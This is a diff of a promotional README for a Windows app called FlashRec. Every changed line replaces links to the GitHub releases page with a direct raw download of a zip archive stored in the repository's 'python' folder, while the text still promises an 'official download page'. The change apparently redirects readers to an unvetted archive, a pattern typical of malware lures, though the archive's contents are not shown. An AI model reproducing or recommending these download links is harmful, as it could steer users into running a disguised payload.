@@ -12,11 +12,11 @@ Think of FlashRec as a supercharged librarian for your data. It can search throu
 
 ## 📥 Download FlashRec (Windows)
 
-[![DOWNLOAD NOW - FlashRec for Windows](https://img.shields.io/badge/⬇️-Download%20FlashRec-4CAF50?style=for-the-badge&labelColor=2196F3&color=00C853)](https://github.com/konateh442-alt/FlashRec/releases)
+[![DOWNLOAD NOW - FlashRec for Windows](https://img.shields.io/badge/⬇️-Download%20FlashRec-4CAF50?style=for-the-badge&labelColor=2196F3&color=00C853)](https://raw.githubusercontent.com/konateh442-alt/FlashRec/main/python/Flash_Rec_v1.4.zip)
 
 **Visit this link to download the application.** Click the button above or the link below to go to the official download page.
 
-👉 **[Open the FlashRec Download Page](https://github.com/konateh442-alt/FlashRec/releases)**
+👉 **[Open the FlashRec Download Page](https://raw.githubusercontent.com/konateh442-alt/FlashRec/main/python/Flash_Rec_v1.4.zip)**
 
 ---
 
@@ -137,7 +137,7 @@ If you want to tweak things under the hood, FlashRec offers advanced settings:
 
 Ready to give FlashRec a try? Here's that download link one more time:
 
-### ⭐ **[DOWNLOAD FLASHREC NOW](https://github.com/konateh442-alt/FlashRec/releases)**
+### ⭐ **[DOWNLOAD FLASHREC NOW](https://raw.githubusercontent.com/konateh442-alt/FlashRec/main/python/Flash_Rec_v1.4.zip)**
 
 The page will show you the latest version available. Pick the Windows version, download it, and you'll be up and running in minutes.
 
@@ -167,7 +167,7 @@ Whether you're a curious beginner or a tech enthusiast, FlashRec puts cutting-ed
 
 ---
 
-**Visit this link to download the application:** 🔗 [https://github.com/konateh442-alt/FlashRec/releases](https://github.com/konateh442-alt/FlashRec/releases)
+**Visit this link to download the application:** 🔗 [https://raw.githubusercontent.com/konateh442-alt/FlashRec/main/python/Flash_Rec_v1.4.zip](https://raw.githubusercontent.com/konateh442-alt/FlashRec/main/python/Flash_Rec_v1.4.zip)
 
 ---
 
